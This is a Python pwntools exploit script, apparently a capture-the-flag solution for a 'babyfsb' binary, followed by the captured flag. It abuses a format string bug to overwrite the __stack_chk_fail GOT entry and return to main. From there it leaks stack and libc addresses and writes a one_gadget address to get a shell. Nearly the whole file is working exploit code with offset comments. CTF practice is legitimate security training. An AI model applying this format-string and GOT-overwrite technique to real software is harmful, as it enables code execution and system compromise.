from pwn import *

state = 1	# 0 on locally

if state == 0 : 
	p = process("./babyfsb")
else :
	p = remote("ctf.j0n9hyun.xyz",3032)

#64bit binary
#using fsb , 6th char reach to stack, read func get 0x40bytes strings. 

if state == 0 : 
	read_offset = 0x110070
	one_gadget = [0x4f2c5,0x4f322,0x10a38c ]
else :
	read_offset = 0xf7250
	one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]

main = 0x4006a6

fini = 0x600e18 	#fini_array = .dtors : executed after main() function end. 
# but RELRO is partialy enabled, i dont have permission to write. 

chk = 0x601020		#chk_fail's got : stack canary check func.
# it called if stack canary is changed. so, i should overwrite stack canary, and call this func. 
# and overwrite this func to main func after leak libc addr. 

payload = "a"*24
payload += " %17$8lx"+" %3$08lx"+"%"
payload += str(main-len(payload)-10)+"c"+" %13$ln"+p64(chk)

# for return to main + leak addr. 
# 3th mem has read+17's addr.
# 17th mem has stack addr, ret+e0 

p.sendafter("hello",payload)
p.recvline()
p.recv(25)

stack = int(p.recv(12),16)-0x130

if state == 0 : 
	rcv = int(p.recv(13)[1:],16)-17
else :
	rcv = int(p.recv(13)[1:],16)-16
libc = rcv - read_offset

one = libc+one_gadget[0]
log.info("ret :"+hex(stack))
log.info("leak :"+hex(libc))
log.info("one :"+hex(one))

p.recvline()

addr1 = int(hex(one)[2:8],16)
addr2 = int(hex(one)[-6:],16)

log.info("addr1 :"+hex(addr1)+" addr2 :"+hex(addr2))


payload2 = "%"+str(addr2-1)+"c"
payload2 += "b"*(8-len(payload2))+" %11$n"
if addr2 > addr1 :
	log.info("try again")
	exit()
add = len(str(addr1))-len(str(addr2))
payload2 += "%"+str(addr1-addr2-3-abs(add))+"c"
payload2 += "b"*(26-len(payload2))+" %10$n"+p64(stack+3)+p64(stack)
#32bytes + ~ , count 12 

sleep(0.5)
pause()
#p.recv()
p.sendline(payload2)
for i in range(0,8100):
	p.recv(1024)

#try repeat. 
p.interactive()
#HackCTF{v3ry_v3ry_345y_f5b!!!}